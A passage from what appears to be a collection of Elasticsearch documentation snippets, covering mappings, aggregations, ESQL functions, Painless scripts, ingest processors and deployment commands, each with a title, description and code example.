    "index.mapping.coerce": false
  },
  "mappings": {
    "properties": {
      "number_one": {
        "type": "integer",
        "coerce": true
      },
      "number_two": {
        "type": "integer"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{ "number_one": "10" }

PUT my-index-000001/_doc/2
{ "number_two": "10" }

----------------------------------------

TITLE: Abstract Distribution Test Case in Java
DESCRIPTION: Shows how to create an abstract test case class for testing multiple distributions with a method to specify the distribution type.

LANGUAGE: java
CODE:
public abstract class MyTestCase {
  @Test
  public void myTest() { /* do something with the value of #distribution() */ }
  abstract Distribution distribution();
}

----------------------------------------

TITLE: Artificial Documents MLT Query
DESCRIPTION: Example showing how to use more_like_this query with artificial documents not present in the index, combining with existing documents.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "more_like_this": {
      "fields": [ "name.first", "name.last" ],
      "like": [
        {
          "_index": "marvel",
          "doc": {
            "name": {
              "first": "Ben",
              "last": "Grimm"
            },
            "_doc": "You got no idea what I'd... what I'd give to be invisible."
          }
        },
        {
          "_index": "marvel",
          "_id": "2"
        }
      ],
      "min_term_freq": 1,
      "max_query_terms": 12
    }
  }
}

----------------------------------------

TITLE: Self-Managed Plugin Management Configuration
DESCRIPTION: Deployment configuration marker indicating self-managed deployment plugin management functionality.

LANGUAGE: yaml
CODE:
{applies_to}
    self: ga

----------------------------------------

TITLE: Configuring Set Security User Processor in Elasticsearch Ingest Pipeline
DESCRIPTION: This example demonstrates how to add a Set Security User processor to an Elasticsearch ingest pipeline. It configures the processor to add all user details for the current authenticated user to the 'user' field for all processed documents.

LANGUAGE: json
CODE:
{
  "processors" : [
    {
      "set_security_user": {
        "field": "user"
      }
    }
  ]
}

----------------------------------------

TITLE: Generating Elasticsearch Node Certificates using certutil
DESCRIPTION: Command example showing how to use elasticsearch-certutil to generate new node certificates using the CA keystore. The command generates a certificate for a specific hostname using the provided CA keystore.

LANGUAGE: bash
CODE:
elasticsearch-certutil cert --ca ${P12} --dns "hostname.of.your.node" --pass

----------------------------------------

TITLE: Basic Percentiles Bucket Aggregation Syntax in Elasticsearch
DESCRIPTION: Demonstrates the basic syntax for a percentiles_bucket aggregation in Elasticsearch. It specifies the buckets_path parameter to indicate which metric to calculate percentiles for.

LANGUAGE: js
CODE:
{
  "percentiles_bucket": {
    "buckets_path": "the_sum"
  }
}

----------------------------------------

TITLE: Defining Supported Numeric Types for ESQL Arithmetic Function in Markdown
DESCRIPTION: This markdown table defines the supported input numeric types and their corresponding result types for an ESQL arithmetic function. It covers double, integer, long, and unsigned_long as input types, all resulting in double output.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | double |
| long | double |
| unsigned_long | double |

----------------------------------------

TITLE: Creating GCE Instance with Tags for Elasticsearch
DESCRIPTION: Command to create a new GCE instance with specific tags for Elasticsearch discovery filtering. Uses gcloud CLI to create an instance with compute-rw scope and elasticsearch,dev tags.

LANGUAGE: sh
CODE:
gcloud compute instances create myesnode1 --project=es-cloud \
       --scopes=compute-rw \
       --tags=elasticsearch,dev

----------------------------------------

TITLE: Correct Usage of copy_to with Multiple Target Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates the correct way to copy a field's value to multiple target fields using copy_to in Elasticsearch.

LANGUAGE: console
CODE:
PUT good_example_index
{
  "mappings": {
    "properties": {
      "field_1": {
        "type": "text",
        "copy_to": ["field_2", "field_3"]
      },
      "field_2": {
        "type": "text"
      },
      "field_3": {
        "type": "text"
      }
    }
  }
}

----------------------------------------

TITLE: Cardinality Aggregation with Missing Value Handling in Elasticsearch
DESCRIPTION: Shows how to handle missing values in cardinality aggregation. Documents without a value in the 'tag' field will be treated as if they had the value 'N/A'.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "tag_cardinality": {
      "cardinality": {
        "field": "tag",
        "missing": "N/A"
      }
    }
  }
}

----------------------------------------

TITLE: Initiating Data Stream Reindex in Elasticsearch
DESCRIPTION: POST request to start reindexing a data stream named 'my-data-stream' in upgrade mode.

LANGUAGE: console
CODE:
POST _migration/reindex
{
    "source": {
        "index": "my-data-stream"
    },
    "mode": "upgrade"
}

----------------------------------------

TITLE: Running GraphQL Connector Docker Image
DESCRIPTION: Docker command to run the GraphQL connector service using the configuration file.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Null Handling in Multivalued Fields
DESCRIPTION: Shows how null values in arrays are handled at the storage layer, demonstrating that nulls are not preserved in lists.

LANGUAGE: console
CODE:
POST /mv/_doc?refresh
{ "a": [2, null, 1] }

POST /_query
{
  "query": "FROM mv | LIMIT 1"
}

----------------------------------------

TITLE: ESQL Type Support Matrix Table
DESCRIPTION: Markdown table defining supported type combinations for ESQL functions. Shows the relationship between first parameter type, rest parameter types, and the resulting output type.

LANGUAGE: markdown
CODE:
| first | rest | result |
| --- | --- | --- |
| boolean | boolean | boolean |
| boolean | | boolean |
| cartesian_point | cartesian_point | cartesian_point |
| cartesian_shape | cartesian_shape | cartesian_shape |
| date | date | date |
| date_nanos | date_nanos | date_nanos |
| geo_point | geo_point | geo_point |
| geo_shape | geo_shape | geo_shape |
| integer | integer | integer |
| integer | | integer |
| ip | ip | ip |
| keyword | keyword | keyword |
| keyword | | keyword |
| long | long | long |
| long | | long |
| text | text | keyword |
| text | | keyword |
| version | version | version |

----------------------------------------

TITLE: Sorting Documents Using Painless Script in Elasticsearch
DESCRIPTION: Example query demonstrating how to sort search results using a Painless script that calculates the length of the 'theatre' field multiplied by a parameter factor. The script returns a numeric value used for ascending sort order.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "term": {
      "sold": "true"
    }
  },
  "sort": {
    "_script": {
      "type": "number",
      "script": {
        "lang": "painless",
        "source": "doc['theatre'].value.length() * params.factor",
        "params": {
          "factor": 1.1
        }
      },
      "order": "asc"
    }
  }
}

----------------------------------------

TITLE: Basic Boxplot Aggregation in Elasticsearch
DESCRIPTION: Shows the basic syntax for creating a boxplot aggregation on a numeric field. Demonstrates the minimal required configuration using the field parameter.

LANGUAGE: javascript
CODE:
{
  "boxplot": {
    "field": "load_time"
  }
}

----------------------------------------

TITLE: Tail Pipe Syntax Definition
DESCRIPTION: Formal syntax definition for the tail pipe command, which requires a maximum number parameter.

LANGUAGE: txt
CODE:
tail <max>

----------------------------------------

TITLE: Configuring Static Import for BooleanFieldScript Emit Callback in Elasticsearch
DESCRIPTION: Defines a static import for the 'emit' callback function used to collect boolean values for runtime fields. It binds the function to the BooleanFieldScript$Emit class.

LANGUAGE: Configuration
CODE:
static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.BooleanFieldScript, boolean) bound_to org.elasticsearch.script.BooleanFieldScript$Emit
}

----------------------------------------

TITLE: Inline User Dictionary Rules for Nori Tokenizer in Elasticsearch
DESCRIPTION: This example shows how to configure the nori_tokenizer with inline user dictionary rules directly in the tokenizer definition, instead of using an external file.

LANGUAGE: console
CODE:
PUT nori_sample
{
  "settings": {
    "index": {
      "analysis": {
        "tokenizer": {
          "nori_user_dict": {
            "type": "nori_tokenizer",
            "decompound_mode": "mixed",
            "user_dictionary_rules": ["c++", "C쁠쁠", "세종", "세종시 세종 시"]
          }
        },
        "analyzer": {
          "my_analyzer": {
            "type": "custom",
            "tokenizer": "nori_user_dict"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Performing Extended Stats Aggregation on Exam Grades in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the extended_stats aggregation to compute advanced statistics on exam grades. It calculates metrics such as sum of squares, variance, and standard deviation bounds.

LANGUAGE: console
CODE:
GET /exams/_search
{
  "size": 0,
  "aggs": {
    "grades_stats": { "extended_stats": { "field": "grade" } }
  }
}

----------------------------------------

TITLE: Handling Keyword Field Duplicates in ESQL
DESCRIPTION: Shows how keyword field types handle duplicate values by automatically removing them during indexing.

LANGUAGE: console
CODE:
PUT /mv
{
  "mappings": {
    "properties": {
      "b": {"type": "keyword"}
    }
  }
}

POST /mv/_bulk?refresh
{ "index" : {} }
{ "a": 1, "b": ["foo", "foo", "bar"] }
{ "index" : {} }
{ "a": 2, "b": ["bar", "bar"] }

POST /_query
{
  "query": "FROM mv | LIMIT 2"
}

----------------------------------------

TITLE: Basic Array Processing with Foreach Processor
DESCRIPTION: Example showing how to process a simple array of strings using the foreach processor to convert values to uppercase.

LANGUAGE: javascript
CODE:
{
  "values" : ["foo", "bar", "baz"]
}

LANGUAGE: javascript
CODE:
{
  "foreach" : {
    "field" : "values",
    "processor" : {
      "uppercase" : {
        "field" : "_ingest._value"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Maximum Merge Threads in Elasticsearch
DESCRIPTION: Setting to control the maximum number of concurrent merge threads per shard. The default value is calculated based on available processors and is optimized for SSD storage. For spinning disk drives, it should be set to 1.

LANGUAGE: yaml
CODE:
index.merge.scheduler.max_thread_count

----------------------------------------

TITLE: Including TO_LOWER Function Types in Markdown
DESCRIPTION: This snippet includes the supported types for the TO_LOWER function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../types/to_lower.md
:::

----------------------------------------

TITLE: Documenting ESQL Function Parameters
DESCRIPTION: Markdown documentation defining the parameters for an ESQL function test case. Specifies a multivalue expression field parameter.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`field`
:   Multivalue expression.

----------------------------------------

TITLE: Synthetic _source with IP Fields in Elasticsearch
DESCRIPTION: This example illustrates how synthetic _source handles IP field values, including sorting and removing duplicates for both IPv4 and IPv6 addresses.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "ip": { "type": "ip" }
    }
  }
}
PUT idx/_doc/1
{
  "ip": ["192.168.0.1", "192.168.0.1", "10.10.12.123",
         "2001:db8::1:0:0:1", "::afff:4567:890a"]
}

----------------------------------------

TITLE: Match Boolean Prefix Query with Custom Analyzer
DESCRIPTION: Illustrates how to specify a custom analyzer for the match_bool_prefix query using the analyzer parameter.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_bool_prefix": {
      "message": {
        "query": "quick brown f",
        "analyzer": "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Running EQL Test Against Manual Elasticsearch Node
DESCRIPTION: Executes a specific EQL query test against a manually started Elasticsearch node, useful for debugging server-side issues.

LANGUAGE: shell
CODE:
./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests "org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}" -Dtests.rest.cluster=localhost:9200 -Dtests.cluster=localhost:9200 -Dtests.clustername=runTask-0

----------------------------------------

TITLE: Explicit Date Casting in ESQL Query
DESCRIPTION: Example showing explicit date conversion using to_datetime function in an ESQL query that calculates date difference between a fixed date and birth_date field.

LANGUAGE: esql
CODE:
FROM employees
| EVAL dd_ns1=date_diff("day", to_datetime("2023-12-02T11:00:00.00Z"), birth_date)
| SORT emp_no
| KEEP dd_ns1
| LIMIT 1

----------------------------------------

TITLE: RIGHT Function Documentation Comment
DESCRIPTION: Header comment indicating this is auto-generated documentation for the ESQL RIGHT function, with instructions not to edit manually.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Dissect Processor Configuration
DESCRIPTION: Example configuration for the dissect processor showing field and pattern settings.

LANGUAGE: js
CODE:
{
  "dissect": {
    "field": "message",
    "pattern" : "%{clientip} %{ident} %{auth} [%{@timestamp}] \"%{verb} %{request} HTTP/%{httpversion}\" %{status} %{size}"
   }
}

----------------------------------------

TITLE: Geohash Grid Aggregation and Query
DESCRIPTION: Demonstrates using geohash_grid aggregation to group documents by location and then querying a specific geohash cell.

LANGUAGE: console
CODE:
GET /my_locations/_search
{
  "size" : 0,
  "aggs" : {
     "grouped" : {
        "geohash_grid" : {
           "field" : "location",
           "precision" : 2
        }
     }
  }
}

LANGUAGE: console
CODE:
GET /my_locations/_search
{
  "query": {
    "geo_grid" :{
      "location" : {
        "geohash" : "u0"
      }
    }
  }
}

----------------------------------------

TITLE: ESQL Function Parameter Definition in Markdown
DESCRIPTION: Defines a string parameter for an ESQL function, specifying that the function returns null if the input is null.

LANGUAGE: markdown
CODE:
`string`
:   String expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Including DATE_DIFF Function Supported Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the supported data types for the DATE_DIFF function.

LANGUAGE: markdown
CODE:
:::{include} ../types/date_diff.md
:::

----------------------------------------

TITLE: Querying Flattened Fields in Elasticsearch
DESCRIPTION: Examples of different query types supported by flattened fields, including term queries and dot notation for specific keys.

LANGUAGE: console
CODE:
POST bug_reports/_search
{
  "query": {
    "term": {"labels": "urgent"}
  }
}

POST bug_reports/_search
{
  "query": {
    "term": {"labels.release": "v1.3.0"}
  }
}

----------------------------------------

TITLE: Embedding SVG Image for HYPOT Function Syntax in Markdown
DESCRIPTION: Embeds an SVG image displaying the syntax of the HYPOT function in ESQL documentation.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/hypot.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Calculating Square Root using SQRT Function in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the SQRT function in Elasticsearch SQL to calculate the square root of a number. It creates a row with a double value and then applies the SQRT function to that value.

LANGUAGE: sql
CODE:
ROW d = 100.0
| EVAL s = SQRT(d)

----------------------------------------

TITLE: Stats Aggregation with Runtime Field in Elasticsearch
DESCRIPTION: Shows how to compute stats aggregation using a runtime field that performs calculations using multiple fields. Uses a script to calculate weighted grades.

LANGUAGE: console
CODE:
POST /exams/_search
{
  "size": 0,
  "runtime_mappings": {
    "grade.weighted": {
      "type": "double",
      "script": """
        emit(doc['grade'].value * doc['weight'].value)
      """
    }
  },
  "aggs": {
    "grades_stats": {
      "stats": {
        "field": "grade.weighted"
      }
    }
  }
}

----------------------------------------

TITLE: Stats Aggregation with Runtime Field in Elasticsearch
DESCRIPTION: Shows how to compute stats aggregation using a runtime field that performs calculations using multiple fields. Uses a script to calculate weighted grades.

LANGUAGE: console
CODE:
POST /exams/_search
{
  "size": 0,
  "runtime_mappings": {
    "grade.weighted": {
      "type": "double",
      "script": """
        emit(doc['grade'].value * doc['weight'].value)
      """
    }
  },
  "aggs": {
    "grades_stats": {
      "stats": {
        "field": "grade.weighted"
      }
    }
  }
}

----------------------------------------

TITLE: Describing Pi Function in ESQL
DESCRIPTION: This comment block describes the Pi function in ESQL, which returns the mathematical constant Pi (the ratio of a circle's circumference to its diameter). It includes a link to the Wikipedia page for further information.

LANGUAGE: text
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns [Pi](https://en.wikipedia.org/wiki/Pi), the ratio of a circle's circumference to its diameter.

----------------------------------------

TITLE: Configuring Elasticsearch for Azure Discovery
DESCRIPTION: YAML configuration to set up Elasticsearch with Azure Discovery plugin, including Azure subscription details and keystore information.

LANGUAGE: yaml
CODE:
cloud:
    azure:
        management:
             subscription.id: your_azure_subscription_id
             cloud.service.name: your_azure_cloud_service_name
             keystore:
                   path: /home/elasticsearch/azurekeystore.pkcs12
                   password: your_password_for_keystore

discovery:
    type: azure

# Recommended (warning: non durable disk)
# path.data: /mnt/resource/elasticsearch/data

----------------------------------------

TITLE: Indexing a Document with copy_to Fields in Elasticsearch
DESCRIPTION: This snippet shows how to index a document into the previously created index, demonstrating how the copy_to parameter works in practice.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "first_name": "John",
  "last_name": "Smith"
}

----------------------------------------

TITLE: Creating and Querying Geohash Grid - Low Precision Example
DESCRIPTION: Demonstrates setting up a museums index with geo_point mapping and performing a low-precision geohash grid aggregation with precision level 3.

LANGUAGE: console
CODE:
PUT /museums
{
  "mappings": {
    "properties": {
      "location": {
        "type": "geo_point"
      }
    }
  }
}

POST /museums/_bulk?refresh
{"index":{"_id":1}}
{"location": "POINT (4.912350 52.374081)", "name": "NEMO Science Museum"}
{"index":{"_id":2}}
{"location": "POINT (4.901618 52.369219)", "name": "Museum Het Rembrandthuis"}
{"index":{"_id":3}}
{"location": "POINT (4.914722 52.371667)", "name": "Nederlands Scheepvaartmuseum"}
{"index":{"_id":4}}
{"location": "POINT (4.405200 51.222900)", "name": "Letterenhuis"}
{"index":{"_id":5}}
{"location": "POINT (2.336389 48.861111)", "name": "Musée du Louvre"}
{"index":{"_id":6}}
{"location": "POINT (2.327000 48.860000)", "name": "Musée d'Orsay"}

POST /museums/_search?size=0
{
  "aggregations": {
    "large-grid": {
      "geohash_grid": {
        "field": "location",
        "precision": 3
      }
    }
  }
}

----------------------------------------

TITLE: Creating Shirt Index Mapping in Elasticsearch
DESCRIPTION: Creates an index mapping for shirts with brand, color, and model properties as keywords.

LANGUAGE: json
CODE:
PUT /shirts
{
  "mappings": {
    "properties": {
      "brand": { "type": "keyword"},
      "color": { "type": "keyword"},
      "model": { "type": "keyword"}
    }
  }
}

----------------------------------------

TITLE: Including Detailed Description in Markdown
DESCRIPTION: This snippet includes a separate Markdown file containing a detailed description of the 'less than' operator using a special syntax.

LANGUAGE: markdown
CODE:
:::{include} ../detailedDescription/less_than.md
:::

----------------------------------------

TITLE: Method Call Operator in Painless
DESCRIPTION: Demonstrates how to use the method call operator '()' to invoke methods on reference type values in Painless. Includes examples of method calls on different reference types and handling of implicit casting.

LANGUAGE: painless
CODE:
Map m = new HashMap();
m.put(1, 2);
int z = m.get(1);
def d = new ArrayList();
d.add(1);
int i = Integer.parseInt(d.get(0).toString());

----------------------------------------

TITLE: Histogram Field Sum Aggregation Setup
DESCRIPTION: Shows how to set up and populate an index with histogram data for latency metrics across different networks.

LANGUAGE: console
CODE:
PUT metrics_index
{
  "mappings": {
    "properties": {
      "latency_histo": { "type": "histogram" }
    }
  }
}

PUT metrics_index/_doc/1?refresh
{
  "network.name" : "net-1",
  "latency_histo" : {
      "values" : [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [3, 7, 23, 12, 6]
   }
}

PUT metrics_index/_doc/2?refresh
{
  "network.name" : "net-2",
  "latency_histo" : {
      "values" :  [0.1, 0.2, 0.3, 0.4, 0.5],
      "counts" : [8, 17, 8, 7, 6]
   }
}

POST /metrics_index/_search?size=0&filter_path=aggregations
{
  "aggs" : {
    "total_latency" : { "sum" : { "field" : "latency_histo" } }
  }
}

----------------------------------------

TITLE: String Class Augmentations for Hashing Functions
DESCRIPTION: Extends the Java String class with cryptographic hash methods including SHA-1, SHA-256, and SHA-512 through Painless API augmentation.

LANGUAGE: java
CODE:
class java.lang.String {
  String org.elasticsearch.painless.api.Augmentation sha1()
  String org.elasticsearch.painless.api.Augmentation sha256()
  String org.elasticsearch.painless.api.Augmentation sha512()
}

----------------------------------------

TITLE: Running Docker Container for Zoom Connector
DESCRIPTION: Shell command to run the Zoom connector Docker container

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Getting Day of Week from DateTime Field in Painless
DESCRIPTION: Script to extract the day of week name from a datetime field using Painless scripting. Uses getDayOfWeekEnum() to convert the datetime value to a full text day name.

LANGUAGE: painless
CODE:
doc['datetime'].value.getDayOfWeekEnum().getDisplayName(TextStyle.FULL, Locale.ROOT)

----------------------------------------

TITLE: Configuring CSV Processor in Elasticsearch Ingest Pipeline
DESCRIPTION: This JSON snippet demonstrates how to configure the CSV processor in an Elasticsearch ingest pipeline. It specifies the field to extract data from and the target fields to assign the extracted values to.

LANGUAGE: json
CODE:
{
  "csv": {
    "field": "my_field",
    "target_fields": ["field1", "field2"]
  }
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice Template
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. Includes placeholder fields for copyright year and owner information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Including TOP Function Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the types information for the TOP function.

LANGUAGE: markdown
CODE:
:::{include} ../types/top.md
:::

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function using Markdown syntax. It specifies a single parameter 'field' and describes its input requirements.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Configuring Local Exporter in YAML
DESCRIPTION: Example configuration for a local monitoring exporter that exports data to the local cluster.

LANGUAGE: yaml
CODE:
xpack.monitoring.exporters.my_local:
  type: local

----------------------------------------

TITLE: Checking Command Line Usage
DESCRIPTION: EQL query to find regsvr32.exe processes launched from command line.

LANGUAGE: console
CODE:
GET /my-data-stream/_eql/search
{
  "query": """
    process where process.name == "regsvr32.exe" and process.command_line.keyword != null
  """
}

----------------------------------------

TITLE: Class Whitelisting for CompositeFieldScript
DESCRIPTION: Whitelists the CompositeFieldScript base class and its Factory class without allowing direct imports.

LANGUAGE: config
CODE:
class org.elasticsearch.script.CompositeFieldScript @no_import {
}
class org.elasticsearch.script.CompositeFieldScript$Factory @no_import {
}

----------------------------------------

TITLE: Variable Width Histogram Aggregation Response in Elasticsearch
DESCRIPTION: This snippet shows the response format for a variable width histogram aggregation in Elasticsearch. It includes the min, max, and key values for each bucket, as well as the document count within each bucket.

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "prices": {
      "buckets": [
        {
          "min": 10.0,
          "key": 30.0,
          "max": 50.0,
          "doc_count": 2
        },
        {
          "min": 150.0,
          "key": 185.0,
          "max": 200.0,
          "doc_count": 5
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Unicode Copyright Notice
DESCRIPTION: Copyright notice and license terms for Unicode conversion code used in UnicodeUtil.java

LANGUAGE: text
CODE:
Copyright 2001-2004 Unicode, Inc.

Disclaimer

This source code is provided as is by Unicode, Inc. No claims are made as to fitness for any particular purpose. No warranties of any kind are expressed or implied. The recipient agrees to determine applicability of information provided.

Limitations on Rights to Redistribute This Code

Unicode, Inc. hereby grants the right to freely use the information supplied in this file in the creation of products supporting the Unicode Standard, and to make copies of this file in any form for internal or external distribution as long as this notice remains attached.

----------------------------------------

TITLE: Documentation Structure for IP_PREFIX Function
DESCRIPTION: Markdown structure defining the documentation layout for the IP_PREFIX function, including image references and section includes.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `IP_PREFIX` [esql-ip_prefix]

**Syntax**

:::{image} ../../../images/functions/ip_prefix.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/ip_prefix.md
:::

:::{include} ../description/ip_prefix.md
:::

:::{include} ../types/ip_prefix.md
:::

:::{include} ../examples/ip_prefix.md
:::

----------------------------------------

TITLE: Deleting Azure VM Instance
DESCRIPTION: Command to remove a specific VM instance from the Azure Classic environment.

LANGUAGE: sh
CODE:
azure vm delete myesnode1

----------------------------------------

TITLE: Including TO_TIMEDURATION Parameters Documentation
DESCRIPTION: This snippet includes the parameters documentation for the TO_TIMEDURATION function from an external markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_timeduration.md
:::

----------------------------------------

TITLE: Defining Parameters for ESQL Function in Elasticsearch
DESCRIPTION: This snippet defines the parameters for an ESQL function in Elasticsearch. It specifies a single parameter 'number', which is a numeric expression. The function returns null if the input is null.

LANGUAGE: markdown
CODE:
**Parameters**

`number`
:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Parameter documentation for a conditional function in ESQL, defining condition, trueValue, and elseValue parameters. This documentation is auto-generated by AbstractFunctionTestCase.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`condition`
:   A condition.

`trueValue`
:   The value that's returned when the corresponding condition is the first to evaluate to `true`. The default value is returned when no condition matches.

`elseValue`
:   The value that's returned when no condition evaluates to `true`.

----------------------------------------

TITLE: Field Parameter Documentation in ESQL
DESCRIPTION: Documents the field parameter that accepts single or multi-valued columns or expressions as input values.

LANGUAGE: markdown
CODE:
`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Defining Multiple Children per Parent in Join Field
DESCRIPTION: This snippet demonstrates how to define multiple children for a single parent in the join field mapping.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "my_join_field": {
        "type": "join",
        "relations": {
          "question": ["answer", "comment"]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Pattern Capture Sample Input
DESCRIPTION: Example input string for pattern matching demonstration.

LANGUAGE: text
CODE:
"abc123def456"

----------------------------------------

TITLE: Defining Range Bucket Parameters in Elasticsearch SQL
DESCRIPTION: Parameter specifications for a range bucketing function that handles both numeric and date values. Allows configuration of bucket count or size, with optional range boundaries.

LANGUAGE: markdown
CODE:
field\n:   Numeric or date expression from which to derive buckets.\n\nbuckets\n:   Target number of buckets, or desired bucket size if `from` and `to` parameters are omitted.\n\nfrom\n:   Start of the range. Can be a number, a date or a date expressed as a string.\n\nto\n:   End of the range. Can be a number, a date or a date expressed as a string.

----------------------------------------

TITLE: Computing SHA256 Hash in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates how to use the SHA256 function in an ESQL query. It filters out messages with 'Connection error', computes the SHA256 hash of the remaining messages, and selects only the message and its hash.

LANGUAGE: sql
CODE:
FROM sample_data
| WHERE message != "Connection error"
| EVAL sha256 = sha256(message)
| KEEP message, sha256

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. The notice should be customized with copyright owner information and formatted according to the file type.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Including ST_XMIN Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the ST_XMIN function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/st_xmin.md
:::

----------------------------------------

TITLE: Creating IP Address Mapping and Sample Data - Elasticsearch Console
DESCRIPTION: Creates an index with IP address mappings and loads sample network traffic data containing both IPv4 and IPv6 addresses.

LANGUAGE: console
CODE:
PUT network-traffic
{
    "mappings": {
        "properties": {
            "ipv4": { "type": "ip" },
            "ipv6": { "type": "ip" }
        }
    }
}

POST /network-traffic/_bulk?refresh
{"index":{"_id":0}}
{"ipv4":"192.168.1.10","ipv6":"2001:db8:a4f8:112a:6001:0:12:7f10"}
{"index":{"_id":1}}
{"ipv4":"192.168.1.12","ipv6":"2001:db8:a4f8:112a:6001:0:12:7f12"}
{"index":{"_id":2}}
{ "ipv4":"192.168.1.33","ipv6":"2001:db8:a4f8:112a:6001:0:12:7f33"}
{"index":{"_id":3}}
{"ipv4":"192.168.1.10","ipv6":"2001:db8:a4f8:112a:6001:0:12:7f10"}
{"index":{"_id":4}}
{"ipv4":"192.168.2.41","ipv6":"2001:db8:a4f8:112c:6001:0:12:7f41"}
{"index":{"_id":5}}
{"ipv4":"192.168.2.10","ipv6":"2001:db8:a4f8:112c:6001:0:12:7f10"}
{"index":{"_id":6}}
{"ipv4":"192.168.2.23","ipv6":"2001:db8:a4f8:112c:6001:0:12:7f23"}
{"index":{"_id":7}}
{"ipv4":"192.168.3.201","ipv6":"2001:db8:a4f8:114f:6001:0:12:7201"}
{"index":{"_id":8}}
{"ipv4":"192.168.3.107","ipv6":"2001:db8:a4f8:114f:6001:0:12:7307"}

----------------------------------------

TITLE: Defining CharacterIterator Interface in Java
DESCRIPTION: Defines the CharacterIterator interface with methods for iterating over a text sequence.

LANGUAGE: java
CODE:
class java.text.CharacterIterator {
  char DONE
  def clone()
  char current()
  char first()
  int getBeginIndex()
  int getEndIndex()
  int getIndex()
  char last()
  char next()
  char previous()
  char setIndex(int)
}

----------------------------------------

TITLE: Installing Nori Analysis Plugin in Elasticsearch
DESCRIPTION: Command to install the Korean (nori) Analysis plugin using Elasticsearch's plugin manager. Must be executed on each node in the cluster, followed by a node restart.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-nori

----------------------------------------

TITLE: Using Wildcards in IP-Based Allocation
DESCRIPTION: Example of using wildcards in IP-based allocation filters to target nodes matching a specific IP pattern.

LANGUAGE: json
CODE:
PUT test/_settings
{
  "index.routing.allocation.include._ip": "192.168.2.*"
}

----------------------------------------

